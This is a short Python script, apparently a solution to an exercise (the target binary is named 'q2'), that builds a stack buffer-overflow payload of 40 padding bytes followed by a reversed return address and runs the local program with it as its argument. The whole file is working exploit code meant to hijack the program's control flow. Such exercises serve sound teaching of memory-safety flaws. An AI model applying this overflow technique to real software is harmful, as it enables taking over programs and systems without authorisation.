import os

buff=40*(b'x')
addr=bytearray.fromhex("0140001581")
addr.reverse()
buff+=addr
print("exec ./q2 with buff", buff)
os.execv('./q2',['./q2', buff]);